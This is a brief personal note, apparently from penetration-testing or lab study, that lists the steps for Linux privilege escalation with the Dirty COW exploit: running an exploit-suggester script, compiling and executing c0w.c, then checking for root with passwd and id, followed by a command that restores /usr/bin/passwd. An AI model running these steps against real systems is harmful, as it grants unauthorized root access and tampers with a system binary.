---
title: dirtycow
updated: 2023-10-14 06:55:14Z
created: 2023-10-14 06:51:19Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

1. In command prompt type:
**./linux-exploit-suggester.sh**
2. From the output, notice that the OS is vulnerable to “**dirtycow**”.
3. compile c0w.c
`gcc -pthread /home/kali/tools/dirtycow/c0w.c -o c0w`
4. Execute:
`./c0w`
5. Exploit:
`passwd`
`id`

To revert changes:
`cp /tmp/bak /usr/bin/passwd`
